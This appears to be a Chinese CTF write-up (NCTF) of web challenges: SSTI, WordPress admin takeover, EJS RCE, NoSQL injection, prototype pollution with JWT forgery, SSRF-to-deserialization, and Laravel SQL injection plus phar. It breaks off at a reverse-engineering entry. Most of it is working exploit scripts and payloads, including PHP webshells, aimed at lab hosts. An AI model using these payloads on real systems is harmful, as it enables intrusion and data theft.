![总榜](https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/%25E6%2580%25BB%25E6%25A6%259C.png)

![校内榜单](https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/%25E6%25A0%25A1%25E5%2586%2585%25E6%25A6%259C%25E5%258D%2595.png)

![解题榜单](https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/%25E8%25A7%25A3%25E9%25A2%2598%25E6%25A6%259C%25E5%258D%2595.png)

[toc]

## WEB

### 你就是我的master吗

出题人tcl，waf写翻车了，+号给跑了，师傅们大多都是非预期打的，不过非预期和预期是差不太多的

waf：
```python=
blacklist = ['%','-',':','+','class','base','mro','_','config','args','init','global','.','\'','req','|','attr','get']
```
预期的payload：
```
?name={{""["\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f"]["\x5f\x5f\x62\x61\x73\x65\x5f\x5f"]["\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f"]()[64]["\x5f\x5f\x69\x6e\x69\x74\x5f\x5f"]["\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f"]["\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f"]["\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f"]("\x6f\x73")["\x70\x6f\x70\x65\x6e"]("ls")["\x72\x65\x61\x64"]()}}
```
全16进制，只能在SSTI的时候用，和\x5f绕_一个道理（其实就是一样的）


### WordPress

取材于一次真实的渗透

#### 信息泄露

打开题目可以发现是一个使用word press的博客，可以在MySQL学习笔记那篇博客里面看到这样一行代码：

```
mysql -h 127.0.0.1 -P 8500 -u www-data
   
```

我们可以尝试MySQL去连接8500端口:
```
mysql -h 靶机ip -P 8500 -u www-data
```
发现能连上，没有web路径写文件的权限，当然也不能读文件。并且发现www-data用户只对wordpress这个库拥有select和inert权限。
wordpress的管理员账号密码就在wp_users这个表里面：
```sql=
mysql> select id,user_login,user_pass from wp_users;
+----+------------+------------------------------------+
| id | user_login | user_pass                          |
+----+------------+------------------------------------+
|  1 | wh1sper    | $P$BK/YzdOi8cNugOBUchcTlIAfuII0270 |
+----+------------+------------------------------------+
1 row in set (0.05 sec)
```
我们可以看到一个经过加密的密码；

#### 登录wordpress后台
>WordPress系统的用户密码是保存在wp_users数据表的user_pass字段，密码是通过Portable PHP password hashing framework类产生的，密码的形式是随机且不可逆，同一个明文的密码在不同时间，产生的密文也不一样，相对来说较为安全。
>WordPress用户密码产生的过程是，当需要生成用户密码的时候，随机产生了一个salt，然后将salt和password相加，又进行了count次md5，最后和encode64的hash数值累加，就得到了一个以$P$开头的密码，这个密码每次产生的结果都不一样
>不过，修改WordPress用户密码还有更简单的方法，就是直接将wp_users数据表的user_pass字段修改为32位的md5(passowrd)即可修改密码为password，这样的密码形式当然不是很安全，所以，当这个用户在WordPress登录后，系统会自动将MD5密码修改为以$P$开头的密码。
>WordPress的这种支持简单md5格式的密码使得其他系统（例如Ucenter系统）的用户整合WordPress更为简单。

可以直接使用32位的MD5当作密码来插入一个用户，当然也可以随便找一组hash `$P$9IQRaTwmfeRo7ud9Fh4E2PdI0S3r.L0` test12345，不过如果使用MD5的话，相同的用户密码只能登陆一次就会失效（www-data没有update权限）

插入用户：

```sql=
mysql> insert into wp_users (id,user_login,user_pass,user_status) value(2,'leon','e10adc3949ba59abbe56e057f20f883e',0);
//密码123456
```
我们尝试用leon/123456登录后台

此时我们发现登录之后并没有跳转到后台，原因是leon现在只是一个普通用户而不是管理员

我们看看还有哪些表：

```sql=
mysql> show tables;
+-----------------------+
| Tables_in_wordpress   |
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_test               |
| wp_usermeta           |
| wp_users              |
+-----------------------+
13 rows in set (0.00 sec)
```
可以猜测到wp_usermeta和用户权限可能有关系；

```sql=
mysql> insert into wp_usermeta value(22,2,'wp_capabilities','a:1:{s:13:"administrator";b:1;}');
Query OK, 1 row affected (0.00 sec)
 
mysql> insert into wp_usermeta value(23,2,'wp_user_level','10');
Query OK, 1 row affected (0.00 sec)
```
刷新，后台自来

#### wordpress后台getshell
其实这个方法很多。

你可以修改某个页面，在里面插入一句话木马，也可以上传一个含有后门的主题等等

~~不过为了不让题目环境被破坏，只给了upload目录权限，希望的是通过安装插件来进行getshell~~又翻车了，可以改插件的源码插入木马

可以直接在安装插件那里上传一个php文件，虽然提示需要FTP密码，不过那是后话 ，重点是你的php文件已经传上去了，直接访问wordpress/wp-content/uploads/2020/11/shell.php就可以RCE了。

读取/flag即可获得flag。

NCTF{wordpress_just_4_fun}








### JS-world

这道题主要是为了说明：

* 前端waf不是waf

题目的功能为：用户可输入code.之后访问`/templates`得到一个自定义的页面。页面提示Proudly presented by ejs。可能使用ejs渲染了页面。

首先在/js/script.js中找到混淆后的js代码.之后就是去混淆看逻辑了

这里我的原始代码如下，去混淆的话基本能看懂大概的逻辑吧。
```javascript
function xor(key, value) {
    var keyLen = key.length;
    return Array.prototype.slice.call(value).map(function(char, idx) {
        return String.fromCharCode(char.charCodeAt(0) ^ key[idx % keyLen].charCodeAt(0));
    }).join('');
}


function create() {
    var code=document.getElementById("MyCode").value;
    code=code.replace(/[\/\*\'\"\`\<\\\>\-\(\)\[\]\=\%\.]/g,'');
    var data=`<html>
<head>
<link rel="stylesheet" href="/bootstrap/css/bootstrap.min.css">
<title>Home - Your Template
</title>
</head>
<h1>Proudly presented by ejs</h1>
<body>
<code>`+ code +`</code>
</body>
</html>`;
    data = btoa(xor("r5NmfIzU1uzl6Wp", data));
    var xmlRequest = new XMLHttpRequest();
    xmlRequest.open("POST", "/create", true);
    xmlRequest.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    var body = "code=" + escape(data);
    xmlRequest.send(body);
    alert(`Done.\nCheck /templates now.`)
    return '';
}
```
所以通过前端传递字符的话敏感字符全部被替换为空，通过xmlrequest传递一个xor+base64后的字符串给/create路由.然后生成页面

从我们看到的页面结果可以推测，服务端应该用相同的密钥又xor了一次。由于前端限制等于没有限制，我们直接向路由传递数据即可。

简单阅读下xor函数逻辑即可用python重构一个xor函数.剩下的就是因为ejs渲染页面，所以猜测可以用ejs的模板语句直接rce了.直接构造payload即可
```python
import requests
from base64 import b64encode as b64

url='http://42.192.72.11:8090'

PAYLOAD="<%- global.process.mainModule.require('child_process').execSync('cat /flag.txt') %>"

def xor(key,string):
    index = 0
    length =len(key)
    payload=''
    chars=list(map(str,string))
    for char in chars:
        payload = payload + chr(ord(char) ^ ord(key[ index % length]))
        index = index + 1
    return payload

exp = b64(xor('r5NmfIzU1uzl6Wp',PAYLOAD).encode()).decode()
s = requests.session()
s.get(url)
s.post(url+'/create',data={'code': exp})
r=s.get(url+'/templates')
print(r.text)
```


### Mango


* nosql 注入

Mango的名字其实就是在暗示mongodb。而与mongodb相关的漏洞nosql算是比较常见的了。

首先如果尝试在signup页面注册的话会爆出mongodb的错误。这样也能看出应用用的是mongodb了

![](https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/zcl7TYM.png)

接下来就是尝试nosql注入了.

这里很重要的一点就是FUZZ。假如我们在登录页面传递json数据，尝试登录的话
`{"username": {"$eq": "admin"}, "password": {"$ne": "123" }}`
会发现返回了302
![](https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/nDyiir8.png)
（实际上用这个session也可以正常登录admin，拿到第二部分flag.）
既然如此，那就尝试下把完整的密码拿到手吧。

我们可以使用`$regex`来正则查询内容，那这样就可以根据状态码的差异进行nosql注入了。

可以看看paylaodallthethings学习下
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection

然后有个小坑点，admin密码第二位特意设计成了`$`， `$`是正则表达式匹配字符串结束位置的。如果直接用`$`这个字符去匹配必然是匹不到的。所以记得特殊字符转义一下

盲注密码
```python
import requests
import re
import string

url = 'http://42.192.72.11:8091/signin'

payload = "^"
flag = ""
for i in range(1, 100):
    a = 0
    print(i)
    for j in string.printable:
        test = re.escape(j)
        data = {"username": {"$eq": "admin"}, "password": {"$regex": payload + test}}
        r = requests.post(url, json=data, allow_redirects=False)
        if r.status_code == 302:
            payload += test
            flag += j
            print(flag)
            a = 1
            break
    if a == 0:
        break
```
`re.escape(j)`就是为了转义`$`这样的。最后我们盲注得到完整密码即可拿到前半段flag.

最后多嘴一句。这道题想了想还是按黑盒而不是白盒放出来的。一方面我觉得mongodb是可以直接测出来的。然后json传递数据应该是nodejs一个必测的tricks.
* `app.use(express.json())`
这个中间件允许我们传入json数据。而json数据允许我们传入一个对象.而既然能传入对象，搭配mongodb的findOne查询语句自然就导致了nosql.

推荐wupco师傅的文章 http://www.wupco.cn/?p=4520 其中就曾提到过类似的问题。


### PackageManager v1/2

* prototype pollution + child_process to RCE.

题目中功能很简单，一个是`/api/package`允许你更改回显的值。还有一个是`/debug`功能调用了子进程`fork('checkcwd.js')`。
`/api/package`处调用的是rep.js中的`replicate`。循环键值，递归处理，标准的原型链污染。
既然如此，就是经典的prototype pollution to RCE了。

参考文章也放到flag里了，
https://xz.aliyun.com/t/6755
其实就是个kibana的CVE。很有参考价值。vulhub上也有环境，可以去看看。
这里有cve作者非常详细的解释
https://slides.com/securitymb/prototype-pollution-in-kibana/

同样不作详细解释，简单说明下重点：
1.下面两种写法是等价的。其中`NODE_OPTIONS`是我们可控的环境变量。
```
NODE_OPTIONS='--require /proc/self/environ' node app.js
//same as
node --require /proc/self/environ app.js
```
2.使用`--require`后。`/proc/self/environ`的内容就会被作为js代码执行。
3.下面的代码是有效的js代码
```javascript
NODE_OPTIONS='--require /proc/self/environ'
NODE_DEBUG=console.log(2333)//SHELL=/bin/bashSESSION_MANAGER=local/byc404
```

然后本题在污染之前有一个AuthMiddleware的中间件，需要jwt decode后为admin.其实这里的认证就是来送的。主要是怕大家都能任意污染直接把靶机给整没了。所以加了个jwt的验证。

考察的其实就是jwt的某个trick,(甚至也是个CVE)
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token#jwt-signature---rs256-to-hs256

那么结合`rep.js`中的污染，就能RCE了。
exp
```python
import requests
import jwt

url = 'http://42.192.72.11:8092'
r = requests.get(url + '/api/package')
cookie = r.headers['Set-Cookie'].split('=')[1].rstrip('; Path')
object = jwt.decode(cookie, verify=None)
object['username'] = 'admin'

token = jwt.encode({'username': 'admin'}, key=object['pk'], algorithm='HS256').decode()
requests.post(url + '/api/package', json={'author': 'byc_404', "description": "321", "__proto__": {"env": {
    "NODE_DEBUG": "console.log(require('child_process').execSync('cat /w0w_Congrats_Th1s_1s_y0ur_flaaag').toString());process.exit()//",
    "NODE_OPTIONS": "-r /proc/self/environ"}}}, cookies={'auth': token})
r = requests.get(url + '/debug/cwd',cookies={'auth': token})
print(r.text)
```
注意这里伪造jwt用的是低版本（0.4.3）的PyJWT。不然高版本会报错。



PackageManagerv2本来是没有的。但是因为出题人出好v1三个月后发现了自己的非预期所以就改成了两题，希望有个循序渐进的效果

v2相比v1有以下几个区别。
1.禁用__proto__
2.只有execSync这一种子进程函数执行。
3.中间件加了限制不能`req.url.includes('/debug')`
4.flag不在这台机器，而是在mongodb里

首先不用`__proto__`的话只要明白原理，使用`Object.prototype`是一样的。即{"constructor":{"prototype":{"env":"..."}
然后是`/debug`的访问。这里是express的一个小trick.我们可以通过更改大小写，使用`/debuG`绕过中间件限制，正常访问debug路由。

最后就是debug路由的`execSync`了。根据上面先知的文章，貌似是说只有fork能污染了，spawn，exec等等都会失效。但是真的是这样吗？

其实并非如此。我们可以实验下。
```javascript
const { exec, execSync, spawn, spawnSync, fork } = require('child_process');
  
// pollute
Object.prototype.env = {
	NODE_DEBUG : 'require("child_process").execSync("mkdir executed")//',
	NODE_OPTIONS : '-r /proc/self/environ'
};

// method 1
fork('');
// method 2
spawn('node', ['--version']).stdout.pipe(process.stdout);
// method 3
console.log(spawnSync('node', ['--version']).stdout.toString());
// method 4
console.log(execSync('node  --version').toString());
```
以上所有步骤均可执行命令`mkdir executed`。也就是说，只有在以node执行命令时，可以加载`NODE_OPTIONS`选项。
我们执行其他命令如`execSync('whoami')`时，底层上是用`/bin/sh -c "whoami"`加载的。那么我们污染的选项就完全没有用到。

那么有没有办法加载我们的选项呢。可以上github阅读下child_process的源码
https://github.com/nodejs/node/blob/master/lib/child_process.js

```javascript
if (options.shell) {
    const command = [file].concat(args).join(' ');
    // Set the shell, switches, and commands.
    if (process.platform === 'win32') {
      if (typeof options.shell === 'string')
        file = options.shell;
      else
        file = process.env.comspec || 'cmd.exe';
      // '/d /s /c' is used only for cmd.exe.
      if (/^(?:.*\\)?cmd(?:\.exe)?$/i.test(file)) {
        args = ['/d', '/s', '/c', `"${command}"`];
        windowsVerbatimArguments = true;
      } else {
        args = ['-c', command];
      }
    } else {
      if (typeof options.shell === 'string')
        file = options.shell;
      else if (process.platform === 'android')
        file = '/system/bin/sh';
      else
        file = '/bin/sh';
      args = ['-c', command];
    }
  }
```

显然此处shell选项是可污染的。我们完全可以覆盖原本的`/bin/sh`为`node`。此时就可以加载我们污染的选项了。

之后会存在一个小问题。那就是`node -c 'whoami'`会报错Cannot find modules。其实就是找不到`whoami.js`这个文件。所以有种解决办法：污染`cwd`到`/tmp`并命令执行`touch /tmp/whoami.js`.
（以上报错不影响命令执行。不过会影响交互式的代码执行）

最后一步就是连接mongodb拿flag。
这里其实目的是模拟一个开发上线到生产结果有依赖跟文件没删掉的
情景。但是貌似模拟的不是很好......所以干脆hint里放出mongodb的ip了。

这里RCE后会发现package.json中存在mongodb依赖。以及/app目录下一个init-test.js
```javascript
// mongo mongodb/flag init-test.js
db.flag.drop();
db.flag.insert(flag);
db.createUser({
    user: "admin",
    pwd:  "admin",
    roles: [ { role: "read", db: "flag", collection:"flag" }]
});
```
所以真正的flag在mongodb中。我们只需简单写一个利用代码即可。
```javascript
MongoClient=require('mongodb').MongoClient;
url ="mongodb://admin:admin@mongodb:27017/flag";
MongoClient.connect(url, { useUnifiedTopology: true } ,function (err, db) {
    if (err) throw err;
    dbo = db.db("flag");
    dbo.collection("flag").find({}).toArray(function (err, result) {
    console.log(result);
    db.close();
    });
});
```
现在只剩下最后一个小问题了。我们刚刚把cwd切换到tmp下了。要想加载mongodb依赖执行代码时还需要污染node依赖路径来调用。所以污染`NODE_PATH='/app/node_modules'`即可

exp
```python
import requests
import jwt

url = 'http://42.192.72.11:8093'
r = requests.get(url + '/api/package')
cookie = r.headers['Set-Cookie'].split('=')[1].rstrip('; Path')
object = jwt.decode(cookie, verify=None)
object['username'] = 'admin'

payload = """MongoClient=require('mongodb').MongoClient;
url ="mongodb://admin:admin@mongodb:27017/flag";
MongoClient.connect(url, { useUnifiedTopology: true } ,function (err, db) {
    if (err) throw err;
    dbo = db.db("flag");
    dbo.collection("flag").find({}).toArray(function (err, result) {
    console.log(result);
    db.close();
    });
});//""".replace("\n", "")

token = jwt.encode({'username': 'admin'}, key=object['pk'], algorithm='HS256').decode()

requests.post(url + '/api/package',
              json={'author': 'byc_404', "description": "321", "constructor": {"prototype": {"env": {
                  "NODE_DEBUG": "console.log(require('child_process').execSync('touch /tmp/whoami.js').toString());process.exit()//",
                  "NODE_OPTIONS": "-r /proc/self/environ", "NODE_PATH": "/app/node_modules"}, "shell": "node",
                  "cwd": "/tmp"}}},
              cookies={'auth': token})
requests.get(url + '/debuG',cookies={'auth': token})
requests.post(url + '/api/package', json={'author': 'byc_404', "description": "321", "constructor": {
    "prototype": {"env": {"NODE_DEBUG": payload, "NODE_OPTIONS": "-r /proc/self/environ"}}}},
              cookies={'auth': token})
r = requests.get(url + '/debuG',cookies={'auth': token})
print(r.text)
```



### SimpleSimplePie

* ssrf to deserialization

灵感来自于hackthebox的一台靶机Travel.当时环境是wordpress框架。但是利用点却是由simplepie这个插件类导致的。所以不妨单独拿出simplepie来看看。


题目首先看到rss.php应该不难想到要反序列化POP链了
```php
class TemplateHandler{

    public $filename;
    public $handle;

    public function __wakeup()
    {
        if(file_exists($this->filename)){
            echo 'Template file exists.';
        }
    }

    public function __destruct()
    {
        echo $this->handle;
    }
}


class SimpleRSS{
    public $data;
    public $obj;

    public function __construct(){
        $this->init();
    }

    public function init($data,$obj){
        $this->obj=$obj;
        $this->data=$data;
    }

    public function __toString()
    {
        $this->obj->visible();
        return 'RSS template is visible now.';
    }
}

class FileHandler{

    public $filename;
    public $content;
    public $handle;

    public function __construct($filename,$content,$handle){
        $this->filename=$filename;
        $this->content=$content;
        $this->handle=$handle;
    }

    public function write(){
        file_put_contents(__DIR__.'/cache_logs/'.$this->filename,$this->content);
    }

    public function __call($name, $arguments){
        if (array_key_exists($name, $this->handle)) {
            call_user_func_array($this->handle[$name], $arguments);
        }
    }
}
```
这里的预期pop链有点迷你thinkphp5的反序列化pop链的意思。
预期利用pop链是：`__wakeup => __toString => __call =>write` 达成写文件。
有这样几个注意点：
1.使用`__wakeup`而非`__destruct`作为起点。这个需要自己试验，否则会发现在对象销毁前就已经报错了。没法进入`__destruct`.
2.`file_exists`触发`__toString`.然后`visible`触发`__call`。但是call只有一个参数可控。`$arguments`.不可控。所以只能调用无参数函数。但是此处ssrf并没有回显。所以没法用phpinfo之类的。
3.因此特意准备好了一个write方法参数可控。所以只要知道调用本类的write方法即可写入webshell。
用的比较常见的trick:
>call_user_func_array在第一个参数是数组时，会默认以键为对象。值为方法调用


那么接下来重点放在找反序列化上。我们可以看到rss.php的另一个功能，执行了curl函数，应该是ssrf了。但是做了不少保护
```php
if(strpos($tmp_url, "file://") !== false or strpos($tmp_url, "@") !== false)
    {
        die("<h2>Hacking attempt prevented (LFI).</h2>");
    }
    if(strpos($tmp_url, "-o") !== false or strpos($tmp_url, "-F") !== false or strpos($tmp_url, "-K") !== false)
    {
        die("<h2>Hacking attempt prevented (Command Injection).</h2>");
    }
    
    $scheme = parse_url($tmp_url)["scheme"];
    $host   = parse_url($tmp_url)["host"];
    $port   = parse_url($tmp_url)["port"];
    
    if (!empty($scheme) && !preg_match('/^http?$/i', $scheme) || 
    !empty($host)   && !in_array($host, [$_SERVER['SERVER_NAME'], 'blog.soreatu.com']) ||
    !empty($port)   && !in_array($port, [$_SERVER['SERVER_PORT'],'80','443']))
    {
        die("<h2>Hacking attempt prevented (SSRF).</h2>");
    }
    return $url;
```
看似很严格但是其实完全不影响打内网ssrf.比如我们可能会使用到的`gopher`协议。注意我们waf里的最后一个对scheme，port与host
的限制。使用的是`||`。只要第一个判断为真就能绕过整个if.

所以使用`gopher:///`让他判断scheme时失效，就能任意打了。


回到源码中，可以判断出来内网存在memcache服务在`172.22.0.4`。而ssrf是可以打memcache的。那么关键就是如何ssrf触发反序列化。


simplepie中如果仔细跟源码的话。会发现其调用了一个`unserialize`函数.对应的生成方法为
```php
$simplepie->set_cache_location('memcache://172.22.0.4:11211/?timeout=60&prefix=byc_');

$simplepie->init(); =>
    $cache = $this->registry->call('Cache', 'get_handler', array($this->cache_location, call_user_func($this->cache_name_function, $url), 'spc'));
    $name => call_user_func($this->cache_name_function, $url) => md5($url)
    $type =>'spc'
        =>
        byc_ +  md5(md5($url)+ ':spc')
```
具体的其实我博客里跟过，有想自己debug下的师傅也可以跟一跟。

也就是说，每次只要我们传入了一个url。simplepie都会在memcache里找对应的键并反序列化。
那么利用就很清楚了，使用ssrf打memcache设置好键。再传递对应的url触发反序列化利用pop链getshell.
生成序列化数据
```php
<?php

class TemplateHandler{
    public $filename;
    public $handle;
}

class SimpleRSS{
    public $data;
    public $obj;

    public function __construct($obj,$data){
        $this->obj=$obj;
        $this->data=$data;
    }
}

class FileHandler{

    public $filename;
    public $content;
    public $handle;

    public function __construct($filename,$content){
        $this->filename=$filename;
        $this->content=$content;
        $this->handle=["visible"=> [$this,"write"]];
    }
}

$c=new FileHandler('byc.php','<?php eval($_REQUEST[byc]);?>');
$o=new TemplateHandler();
$b=new SimpleRSS($c,'byc_404');
$o->filename=$b;
echo(serialize($o));
```

生成打memcache的payload可以用gopherus。
```
#payload
O:15:"TemplateHandler":2:{s:8:"filename";O:9:"SimpleRSS":2:{s:4:"data";s:7:"byc_404";s:3:"obj";O:11:"FileHandler":3:{s:8:"filename";s:7:"byc.php";s:7:"content";s:29:"<?php eval($_REQUEST[byc]);?>";s:6:"handle";a:1:{s:7:"visible";a:2:{i:0;r:4;i:1;s:5:"write";}}}}s:6:"handle";N;}

#ssrf
gopher:///172.22.0.4:11211/_%0d%0aset%20byc_6bb6f7140747a3e1d132e1bbb1b1b664%204%200%20278%0d%0aO:15:%22TemplateHandler%22:2:%7Bs:8:%22filename%22%3BO:9:%22SimpleRSS%22:2:%7Bs:4:%22data%22%3Bs:7:%22byc_404%22%3Bs:3:%22obj%22%3BO:11:%22FileHandler%22:3:%7Bs:8:%22filename%22%3Bs:7:%22byc.php%22%3Bs:7:%22content%22%3Bs:29:%22%3C%3Fphp%20eval%28%24_REQUEST%5Bbyc%5D%29%3B%3F%3E%22%3Bs:6:%22handle%22%3Ba:1:%7Bs:7:%22visible%22%3Ba:2:%7Bi:0%3Br:4%3Bi:1%3Bs:5:%22write%22%3B%7D%7D%7D%7Ds:6:%22handle%22%3BN%3B%7D%0d%0a

#trigger
http://blog.soreatu.com/

#getflag
cache_logs/byc.php?byc=system(%27/readflag%27);
```

写入webshell后根目录readflag即可

```python
import requests

try:
    url = 'http://42.192.72.11:8094/?rss_prod_feed=gopher:///172.22.0.4:11211/_%0d%0aset%20byc_6bb6f7140747a3e1d132e1bbb1b1b664%204%200%20278%0d%0aO:15:%22TemplateHandler%22:2:%7Bs:8:%22filename%22%3BO:9:%22SimpleRSS%22:2:%7Bs:4:%22data%22%3Bs:7:%22byc_404%22%3Bs:3:%22obj%22%3BO:11:%22FileHandler%22:3:%7Bs:8:%22filename%22%3Bs:7:%22byc.php%22%3Bs:7:%22content%22%3Bs:29:%22%3C%3Fphp%20eval%28%24_REQUEST%5Bbyc%5D%29%3B%3F%3E%22%3Bs:6:%22handle%22%3Ba:1:%7Bs:7:%22visible%22%3Ba:2:%7Bi:0%3Br:4%3Bi:1%3Bs:5:%22write%22%3B%7D%7D%7D%7Ds:6:%22handle%22%3BN%3B%7D%0d%0a'
    r = requests.get(url, timeout=1)
    print(r.text)
except Exception as e:
    print('Done')

    
url = 'http://42.192.72.11:8094/?rss_prod_feed=http://blog.soreatu.com'
requests.get(url)
r = requests.get('http://42.192.72.11:8094/cache_logs/byc.php?byc=system("/readflag");')
print(r.text)
```


### bg_laravel

* sql-i + phar  

主要就是laravel5.8.10的一个冷门漏洞与一个常见漏洞的组合拳。laravel5.8.10 的querybuilder是有洞的，即使没有操作原生sql，我们依然可以发现因为`wrapJsonPath`的错误使用，导致了注入。
https://stitcher.io/blog/unsafe-sql-functions-in-laravel

对应的github上可以找到出问题的函数
https://github.com/laravel/framework/commit/a056cd85d0ac59c457e25b2bdea54813f1d8b128

此处debug下就会发现，`order by`处也会触发这个函数。由于使用`a->1`会让原生sql语句变为```json_extract(`a`, '$."1"')```这就有了闭合的机会。因为是`order by`语句后的注入，所以只能时间盲注了。


那么注入有什么用呢。为此我找了下网上几个laravel上传的demo.发现有那种上传后不回显文件名的demo.如果文件名不变就罢了，万一文件名变了就只能在数据库里找了(此处File是一个Eloquent Model,每次上传完文件save的时候都会把对应内容存到数据库中)。而如果我们可控一个文件名，又能做什么呢。

注意到file-check路由很明显的调用了`getimagesize`这样的函数。联系到前面的只准图片上传文件，不难想到此处可以用到phar反序列化了。而laravel5.8的反序列化能做什么不必多说了。我们直接使用phpggc就能生成对应popchain的phar->jpeg文件。剩下的就是用点时间盲注即可。

首先用phpggc加上随便一个图片生成
`./phpggc "system('echo PD9waHAgZXZhbCgkX1JFUVVFU1RbYnljXSk7Pz4= |base64 -d > /app/public/uploads/byc.php');" --phar-jpeg  ./src.jpeg > exp.jpeg`
或者不想用绝对路径用相对也行。靶机装了curl所以curl外带数据也可

之后就是盲注了
```python
import requests
import time
import string
import re

url = 'http://42.192.72.11:8095'


headers={'Cookie':'bg_laravel_session=eyJpdiI6InIzeHBqMU9hbFlMYWRnXC95U3Q2VlNnPT0iLCJ2YWx1ZSI6Ino4K3RySXJPMGNab1NRXC9WRFBpb1lLZk5cL1czTjdDNTlGcXZuYVQ5U1NvK1YxckVZVk5BMG5VNVR6dVFLNWVLUCIsIm1hYyI6IjgxNjFjYTU2ZjUyNzA2Y2E5Mjc4M2VkNTc3ZDZjM2U0NTQ1OTM0ZjhmM2Q1NDhmNWNhYzI3NWY4NzAwMjg2NmIifQ%3D%3D;XSRF-TOKEN=eyJpdiI6ImNzOXVBaE9QTjVuaGJET0YzYlRENFE9PSIsInZhbHVlIjoiQ2wzdG9kM1hPa0YyQUFhOStaZmhBNk1lVDY1REpNdDBjS3N3d2NHek0xWXY1d2ZOWnU4dkVmcGdNc0h0eFFoWCIsIm1hYyI6IjBlN2U2ZGY0MDViZTRlZmFmMTY0MGIwYjYxNTFhNzZkMmZkMmI5YWViNDg2ZTNjY2Y1OWI1MGJiYjM5YTlmMGMifQ%3D%3D'}

def init():
    requests.post(url+'/init',data={'name':'byc_404','age':'21',"gender":'male'},headers=headers)

def edit(payload):
    requests.post(url + '/edit', data={'username': 'byc', 'order': payload, 'direction': 'asc'},headers=headers)

def check():
    r = requests.get(url +'/check',headers=headers)

def exp(name):
    res = "/app/public/uploads/"
    for i in range(21,21+15):
        print(i)
        for j in string.printable:
            payload = 'id->1"\')) or if(ascii(substr((select file_path from files where name = "'+name+'"  order by id desc limit 1),'+str(i)+',1))=' + str(ord(j)) + ',sleep(3),1)#'
            edit(payload)
            t = time.time()
            check()
            if time.time() - t > 3:
                res += j
                print(res)
                break
    return res

init()
filename = exp('exp.jpeg')
print('phar://%s.jpeg' % filename)

# phar:///app/public/uploads/gq415OGukNwcf3t.jpeg
#init()
```

之后拿到check处使用`phar://./uploads/xxxx.jpeg`触发即可。

留个exp的图片。可以在uploads目录下写入shell byc.php

https://hackmd.summershrimp.com/uploads/upload_35a404b1de8226dc705571313750668c.jpeg


###  ezphp

```
难度：简单
考点：gopher构造、PHP反序列化、preg_replace /e命令执行
```

熬夜出的这题，很多地方细节没处理好，但是没影响。

给了部分源码，game.php有反序列化，class.php有php_curl

题目描述`10.10.*.*`说明可能是打内网，后来也给了hint

poc：

```php
<?php

class User{
    public $username;
    public $password;
    public $time;
    public $best_time;
    public $error = "Usage error!";
}

class net_test{
    public $url;

    public function __construct($url){
        $this->url = $url;
    }
}

class Game{
	public $a;
}

$poc = new Game();
$poc->a = new User();
$poc->a->error = new net_test("file:///proc/net/arp");
echo serialize($poc);
```

绕一下wakeup，读hosts：/etc/hosts

```
http://42.192.72.11:40001/game.php?a=O:4:"Game":2:{s:1:"a";O:4:"User":5:{s:8:"username";N;s:8:"password";N;s:4:"time";N;s:9:"best_time";N;s:5:"error";O:8:"net_test":1:{s:3:"url";s:17:"file:///etc/hosts";}}}

127.0.0.1	localhost
::1	localhost ip6-localhost ip6-loopback
fe00::0	ip6-localnet
ff00::0	ip6-mcastprefix
ff02::1	ip6-allnodes
ff02::2	ip6-allrouters
10.10.10.1	2acc6891c3f1
```

读arp：/proc/net/arp

```
http://42.192.72.11:40001/game.php?a=O:4:"Game":2:{s:1:"a";O:4:"User":5:{s:8:"username";N;s:8:"password";N;s:4:"time";N;s:9:"best_time";N;s:5:"error";O:8:"net_test":1:{s:3:"url";s:20:"file:///proc/net/arp";}}}

IP address       HW type     Flags       HW address            Mask     Device
10.10.0.1        0x1         0x2         02:42:28:8a:d6:08     *        eth0
10.10.10.32      0x1         0x2         02:42:0a:0a:0a:20     *        eth0
```

访问10.10.10.32时发现有服务，且直接给了源码：

```php
$poc->a->error = new net_test("http://10.10.10.32");
```

```php
$content = preg_replace(
    '(([0-9])(.*?)\1)e',
    'strtoupper("\\2")',
    $content
);
```

构造：

```
x=1{${eval($_POST[2])}}1&2=phpinfo();
```

所以最后payload：

```php
$poc->a->error = new net_test("gopher://10.10.10.32:80/_POST%20/index.php%20HTTP/1.1%0D%0AHost%3A%2010.10.10.32%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%2048%0D%0AUpgrade-Insecure-Requests%3A%201%0D%0A%0D%0Ax%3D1%7B%24%7Beval%28%24_POST%5B2%5D%29%7D%7D1%262%3Dshow_source%28%27/flag%27%29%3B%0D%0A");
```


```
http://42.192.72.11:40001/game.php?a=O:4:"Game":1:{s:1:"a";O:4:"User":5:{s:8:"username";N;s:8:"password";N;s:4:"time";N;s:9:"best_time";N;s:5:"error";O:8:"net_test":1:{s:3:"url";s:305:"gopher%3a%2f%2f10.10.10.32%3a80%2f_POST%2520%2findex.php%2520HTTP%2f1.1%250D%250AHost%253A%252010.10.10.32%250D%250AContent-Type%253A%2520application%2fx-www-form-urlencoded%250D%250AContent-Length%253A%252048%250D%250AUpgrade-Insecure-Requests%253A%25201%250D%250A%250D%250Ax%253D1%257B%2524%257Beval%2528%2524_POST%255B2%255D%2529%257D%257D1%25262%253Dshow_source%2528%2527%2fflag%2527%2529%253B%250D%250A";}}}
```

> 注意：url编码解码会影响反序列化字符串长度，先将gopher数据一次编码进行序列化，然后将gopher数据进行二次编码再替换原数据打过去

因为mysql无密码，还可以通过mysql日志写shell，然后利用shell进行打内网

NCTF{y0u_4R3_Ma5t3R_0f_S5Rf_4Nd_kN0w_Sh31l}



## Reverse
### re1
直接爆破

```c
a = [ 0xC6, 0x6A, 0xC0, 0x27, 0xEB, 0xCA, 0x65, 0x02, 0x61, 0xCA, 
